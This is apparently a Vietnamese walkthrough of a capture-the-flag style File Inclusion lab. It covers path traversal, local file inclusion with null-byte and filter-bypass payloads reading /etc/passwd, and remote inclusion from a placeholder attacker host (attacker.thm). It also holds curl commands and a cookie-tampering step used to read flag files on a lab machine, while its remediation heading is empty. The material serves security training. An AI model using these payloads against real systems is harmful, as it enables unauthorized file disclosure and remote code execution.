# File Inclusion

***What is File inclusion?***

![img](65)

![img](66)

***Truy cập File Inclusion Lab: ***

![img](67)

***Path Traversal***

![img](68)

Có thể kiểm tra tham số URL bằng cách thêm payload để xem web application hoạt động như nào. Các tấn công ***Path traversal***, hay còn gọi là tấn công ***dot-dot-slash***, lợi dụng việc di chuyển directory lên 1 bậc bằng cách sử dụng double dots ***"../"*** . Nếu attacker tìm thấy entry point, trong TH này là ***get.php?file=***, thì attacker có thể thêm payload vào đó như sau: http://webapp.thm/get.php?file=../../../../etc/passwd

Giả sử không có xác thực input, thay vì truy cập PDF file tại vị trí ***/var/www/app/CVs***, web application sẽ truy xuất files từ các directory khác, trong TH này là ***/etc/passwd***. Mỗi mục .. trong URL sẽ di chuyển một directory cho đến khi đến root directory “/”. Sau đó, nó thay đổi directory thành /etc, từ đó, nó đọc tệp passwd.

![img](69)

=> Kết quả là, web application sẽ gửi lại nội dung file ***/etc/passwd*** đến user: 

***Local File Inclusion - LFI***

Việc khai thác LFI tuân theo khái niệm tương tự như Path traversal.

***Local File Inclusion - LFI #2***

Trong trường hợp không xem được source code, khi này sẽ thực hiện thử nghiệm ***black box testing***.

Giả sử có entry point như sau: http://webapp.thm/index.php?lang=EN. Nếu nhập input không hợp lệ, ví dụ như ***THM***, sẽ gặp lỗi:

***Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12***

Nếu nhìn kỹ vào directory, có thể thấy hàm bao gồm các file trong languages directory đang thêm ***.php*** vào cuối mục nhập ***(THM.php)***. Do đó, input hợp lệ sẽ có dạng ***index.php?lang=EN***, trong đó file EN nằm bên trong languages directory và có tên ***EN.php***

Ngoài ra, thông báo lỗi còn tiết lộ 1 thông tin quan trọng khác về web application directory path là ***/var/www/html/THM-4/***

Để khai thác, thử sử dụng ***../*** để lấy ra folder hiện tại:

http://webapp.thm/index.php?lang=../../../../etc/passwd

***Lưu ý***, sử dụng 4 lần ***../*** vì đã biết path có 4 level là ***/var/www/html/THM-4/***. 

Lúc này vẫn nhận được thông báo lỗi như sau: 

***Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12***

Có vẻ như có thể di chuyển ra khỏi thư mục PHP nhưng include function vẫn đọc input có ***.php*** ở cuối! Điều này cho thấy developer đã chỉ định loại file cần chuyển đến hàm ***include***. Để bypass kịch bản này, sử dụng ***NULL BYTE***, tức là ***%00***.

Sử dụng ***NULL bytes*** là 1 kỹ thuật chèn, trong đó URL được mã hóa, ví dụ như ***%00*** hoặc ***0x00*** ở dạng hex với dữ liệu do user cung cấp để chấm dứt chuỗi. 

Có thể coi hành động này như việc cố gắng đánh lừa web application bỏ qua mọi thứ xảy ra sau ***NULL BYTE***.

Bằng cách thêm Null Byte vào cuối payload, có thể yêu cầu include function bỏ qua mọi thứ sau byte NULL: 

Từ ***include("languages/../../../../../etc/passwd%00").".php";***
Thành ***include("languages/../../../../../etc/passwd");***

***Lưu ý***: kỹ thuật chèn ***%00*** đã được fix, không hoạt động với PHP 5.3.4 trở lên!

Việc khai thác sẽ tương tự như http://webapp.thm/index.php?lang=/etc/passwd/. Cũng có thể sử dụng http://webapp.thm/index.php?lang=/etc/passwd%00

Để giải thích rõ hơn, nếu sử dụng lệnh ***cd ..*** trong hệ điều hành Linux, nó sẽ di chuyển lên một thư mục cha. Tuy nhiên, nếu bạn sử dụng ***cd .***, thì vẫn ở lại thư mục hiện tại. Tương tự, nếu sử dụng ***/etc/passwd/..***, nó sẽ được hiểu là ***/etc/***. Còn nếu thử ***/etc/passwd/.***, kết quả sẽ vẫn là ***/etc/passwd***.

Tiếp theo, trong trường hợp này, developer bắt đầu sử dụng xác thực input bằng cách lọc 2 số keyword. Thử URL:
http://webapp.thm/index.php?lang=../../../../etc/passwd
Sẽ nhận được thông báo lỗi: Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15

Tiếp theo, trong trường hợp này, developer đã bắt đầu áp dụng cơ chế xác thực đầu vào bằng cách lọc hai từ khóa cụ thể. Khi thử truy cập URL:
http://webapp.thm/index.php?lang=../../../../etc/passwd,
sẽ nhận được thông báo lỗi như sau:

***Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15.***

![img](70)

Qua thông báo lỗi, có thể thấy rằng web application đã thay thế chuỗi ***../../../../*** bằng một chuỗi trống, dẫn đến việc đường dẫn trở thành ***languages/etc/passwd***. Tuy nhiên, có một số kỹ thuật để bypass cơ chế lọc này!

Một trong những cách hiệu quả là sử dụng cú pháp:
***....//....//....//....//....//etc/passwd***.
Kỹ thuật này hoạt động bằng cách thay thế mỗi ../ thành ....//, giúp bypass bộ lọc và truy cập được tệp mong muốn.

=> Tại sao cách này có thể bypass được? 

Vì bộ lọc PHP chỉ khớp và thay thế chuỗi tập hợp con đầu tiên ***../*** nó tìm thấy và không thực hiện 1 đợt kiểm tra khác, để lại 1 payload như sau: 
***../../../../etc/passwd***

![img](71)

Cuối cùng, trong TH developer buộc include function đọc từ 1 directory đã được xác định! Ví dụ nếu web application yêu cầu cung cấp input phải bao gồm 1 directory như: http://webapp.thm/index.php?lang=lacular/EN.php , để khai thác điều này, cần bao gồm directory trong payload, ví dụ ***?lang=lacular/../../../../etc/passwd***

![img](72)

***Remote File Inclusion - RFI***

![img](73)

***RFI Steps***

Mã dưới đây là ví dụ các bước để tấn công RFI thành công! Giả sử attacker lưu trữ file PHP trên server của chúng: http://Attacker.thm/cmd.txt trong đó ***cmd.txt*** chứa thông báo ***Hello THM***:

![img](74)

Đầu tiên, attacker chèn URL độc hại, trỏ đến server của attacker, ví dụ http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. Nếu không có xác thực input, URL độc hại sẽ được tiêm vào include function. Tiếp theo, web server sẽ gửi ***GET*** request đến server của attacker để tìm nạp file ***cmd.txt***. Do đó, web application đưa file từ xa vào include function, thực thi tệp PHP và gửi nội dung thực thi cho attacker.

***Remediation (Cách khắc phục)*** 

***Challenge***

Các bước testing LFI - Local File Inclusion:

- Tìm entry point (điểm vào) có thể thông qua GET, POST, COOKIE hoặc HTTP header.

- Nhập input hợp lệ để xem web server hoạt động như nào.

- Nhập input không hợp lệ.

- Không tin những gì nhập vào trong input form, sử dụng address bar hoặc tool như Burp Suite.

- Tìm lỗi khi nhập input không hợp lệ để tiết lộ thông tin path hiện tại của web application.

- Hiểu input hợp lệ, kiểm tra xem có input filter nào không.

- Thử chèn 1 valid entry để đọc các tệp nhạy cảm.

***Challenge 1***

![img](75)

Sử dụng ***curl*** để gửi POST request:

***curl -X POST http://10.10.212.124/challenges/chall1.php -d 'method=GET&file=/etc/flag1'***

![img](76)

Tại sao lại truyền data ***'method=GET&file=/etc/flag1'*** vào POST body?

***method=GET***: Tham số này có thể được sử dụng để chỉ định phương thức mà web server nên sử dụng (ở đây là GET).

***file=/etc/flag1***: Tham số này có thể được sử dụng để chỉ định một tệp cụ thể mà web server cần xử lý (ở đây là /etc/flag1).

![img](77)

Đồng thời, trong source page cho thấy server xử lý việc gửi input form bằng việc sử dụng ***method=GET***.

=> Tìm được flag sau khi chạy lệnh: 

![img](78)

***Challenge 2***

![img](79)

Sử dụng Burp Suite: 

![img](80)

=> Tìm được header ***Cookie*** có value là ***THM=Guest***. Thay đổi thành ***admin***: 

![img](81)

=> Có thể truy cập vào trang admin

=> Tiếp tục thư thay đổi cookie thành ***../../../../etc/flag2%00***:

![img](82)

***Challenge 3***

![img](83)

Thử sử dụng ***curl*** gửi POST request: 

***curl -X POST http://10.10.212.124/challenges/chall3.php -d 'method=POST&file=../../../../etc/flag3%00' --output -***

Thay đổi method thành POST vì chall3 này bắt nhập thẳng vào File Name field.

![img](84)

=> Kết quả: 

![img](85)







